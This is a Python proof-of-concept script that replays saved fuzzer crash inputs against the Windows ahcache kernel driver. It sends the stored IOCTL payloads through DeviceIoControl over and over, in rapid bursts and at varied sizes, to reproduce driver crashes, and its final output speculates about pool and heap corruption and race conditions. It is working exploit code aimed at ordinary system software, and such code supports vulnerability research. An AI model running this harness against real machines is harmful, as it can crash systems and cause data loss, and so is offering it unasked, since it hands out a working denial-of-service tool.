#!/usr/bin/env python3
"""
Stress PoC - Test crash reproducibility
Some crashes require repeated calls or specific state
"""

import ctypes
from ctypes import wintypes
import sys
import os
import time

kernel32 = ctypes.windll.kernel32
ntdll = ctypes.windll.ntdll

GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
OPEN_EXISTING = 3
FILE_ATTRIBUTE_NORMAL = 0x80
INVALID_HANDLE_VALUE = -1

def open_driver(device_path):
    handle = kernel32.CreateFileW(
        device_path,
        GENERIC_READ | GENERIC_WRITE,
        0,
        None,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        None
    )
    return handle

def send_ioctl(handle, ioctl_code, in_buffer, out_size=0x1000):
    in_buf = ctypes.create_string_buffer(in_buffer, len(in_buffer))
    out_buf = ctypes.create_string_buffer(out_size)
    bytes_returned = wintypes.DWORD()
    
    result = kernel32.DeviceIoControl(
        handle,
        ioctl_code,
        in_buf,
        len(in_buffer),
        out_buf,
        out_size,
        ctypes.byref(bytes_returned),
        None
    )
    
    error = kernel32.GetLastError()
    return result, error, out_buf.raw[:bytes_returned.value] if result else None

def load_crash_payload(crash_dir):
    """Load payload from crash directory"""
    input_file = os.path.join(crash_dir, "input.bin")
    info_file = os.path.join(crash_dir, "info.txt")
    
    if not os.path.exists(input_file):
        return None, None
    
    with open(input_file, "rb") as f:
        payload = f.read()
    
    ioctl = None
    if os.path.exists(info_file):
        with open(info_file, "r") as f:
            for line in f:
                if line.startswith("IOCTL:"):
                    ioctl = int(line.split(":")[1].strip(), 16)
    
    return payload, ioctl

def main():
    if len(sys.argv) < 2:
        print("Usage: stress_poc.py <crash_dir> [iterations]")
        print("       stress_poc.py --all <crashes_folder> [iterations]")
        sys.exit(1)
    
    device = r"\\.\ahcache"
    iterations = 100
    
    if sys.argv[1] == "--all":
        # Test all crashes
        crashes_dir = sys.argv[2] if len(sys.argv) > 2 else "./crashes"
        iterations = int(sys.argv[3]) if len(sys.argv) > 3 else 10
        
        print(f"[*] Testing all crashes in {crashes_dir}")
        print(f"[*] {iterations} iterations each\n")
        
        reproducible = []
        
        for crash_name in sorted(os.listdir(crashes_dir)):
            crash_dir = os.path.join(crashes_dir, crash_name)
            if not os.path.isdir(crash_dir) or not crash_name.startswith("crash_"):
                continue
            
            payload, ioctl = load_crash_payload(crash_dir)
            if not payload or not ioctl:
                continue
            
            # Quick test
            handle = open_driver(device)
            if handle == INVALID_HANDLE_VALUE:
                print(f"[!] Can't open driver")
                break
            
            crashed = False
            for i in range(iterations):
                result, error, _ = send_ioctl(handle, ioctl, payload)
                if error == 0x5:  # ACCESS_DENIED - might indicate driver issue
                    crashed = True
                    break
            
            kernel32.CloseHandle(handle)
            
            # Check if handle is still valid by trying to reopen
            test_handle = open_driver(device)
            if test_handle == INVALID_HANDLE_VALUE:
                print(f"[💥] {crash_name} - DRIVER CRASHED!")
                reproducible.append(crash_name)
                time.sleep(1)  # Wait for driver recovery
            else:
                kernel32.CloseHandle(test_handle)
                print(f"[  ] {crash_name} - no crash")
        
        print(f"\n[+] Reproducible crashes: {len(reproducible)}")
        for r in reproducible:
            print(f"    {r}")
        return
    
    # Single crash test
    crash_dir = sys.argv[1]
    iterations = int(sys.argv[2]) if len(sys.argv) > 2 else 100
    
    payload, ioctl = load_crash_payload(crash_dir)
    if not payload or not ioctl:
        print(f"[!] Can't load crash from {crash_dir}")
        sys.exit(1)
    
    print(f"[*] Testing crash: {crash_dir}")
    print(f"[*] IOCTL: 0x{ioctl:08X}")
    print(f"[*] Payload: {len(payload)} bytes")
    print(f"[*] Iterations: {iterations}")
    print()
    
    # Method 1: Single handle, repeated calls
    print("[*] Method 1: Single handle, repeated IOCTL calls...")
    handle = open_driver(device)
    if handle == INVALID_HANDLE_VALUE:
        print(f"[!] Failed to open {device}")
        sys.exit(1)
    
    errors = {}
    for i in range(iterations):
        result, error, data = send_ioctl(handle, ioctl, payload)
        errors[error] = errors.get(error, 0) + 1
        
        if i % 10 == 0:
            print(f"\r    Iteration {i}/{iterations}...", end="", flush=True)
    
    print(f"\r    Done! Error codes: {errors}")
    kernel32.CloseHandle(handle)
    
    # Method 2: New handle each time
    print("\n[*] Method 2: New handle per call...")
    errors = {}
    for i in range(iterations):
        handle = open_driver(device)
        if handle == INVALID_HANDLE_VALUE:
            print(f"\n[💥] DRIVER CRASHED at iteration {i}!")
            break
        
        result, error, data = send_ioctl(handle, ioctl, payload)
        errors[error] = errors.get(error, 0) + 1
        kernel32.CloseHandle(handle)
        
        if i % 10 == 0:
            print(f"\r    Iteration {i}/{iterations}...", end="", flush=True)
    
    print(f"\r    Done! Error codes: {errors}")
    
    # Method 3: Rapid fire (no sleep)
    print("\n[*] Method 3: Rapid fire mode...")
    handle = open_driver(device)
    if handle == INVALID_HANDLE_VALUE:
        print("[!] Can't open driver - may have crashed!")
    else:
        start = time.time()
        for i in range(iterations * 10):
            send_ioctl(handle, ioctl, payload)
        elapsed = time.time() - start
        print(f"    {iterations*10} calls in {elapsed:.2f}s ({(iterations*10)/elapsed:.0f}/s)")
        kernel32.CloseHandle(handle)
    
    # Method 4: Different payload sizes
    print("\n[*] Method 4: Testing different sizes...")
    sizes = [0, 1, 4, 8, 16, 32, 64, 128, 256, 512, 1024, 4096]
    handle = open_driver(device)
    if handle != INVALID_HANDLE_VALUE:
        for size in sizes:
            test_payload = payload[:size] if size <= len(payload) else payload + b"\x00" * (size - len(payload))
            result, error, _ = send_ioctl(handle, ioctl, test_payload)
            status = "OK" if result else f"err=0x{error:X}"
            print(f"    Size {size:5}: {status}")
        kernel32.CloseHandle(handle)
    
    print("\n[*] If no crash, the bug may be:")
    print("    - State-dependent (requires prior IOCTLs)")
    print("    - Race condition (timing-dependent)")
    print("    - Heap corruption (manifests later)")
    print("    - Pool corruption (requires allocation pressure)")

if __name__ == "__main__":
    main()
